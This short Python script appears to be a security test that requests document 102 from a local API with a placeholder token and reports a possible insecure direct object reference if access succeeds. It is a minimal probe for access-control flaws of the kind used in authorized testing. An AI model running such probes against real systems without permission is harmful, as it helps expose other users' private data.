import requests

# Target URL for IDOR testing
url = "http://127.0.0.1:8888/api/documents/102"

# Session with a valid user context (if required, include headers or cookies here)
headers = {
    'Authorization': 'Bearer <replace_with_valid_token_if_required>'
}

response = requests.get(url, headers=headers)

if response.status_code == 200:
    print("Potential IDOR found! Accessed document without proper authorization.")
    print("\nResponse:")
    print(response.text)
else:
    print("Access denied or endpoint secured.")
    print("\nStatus code:", response.status_code)
    print("\nResponse:")
    print(response.text)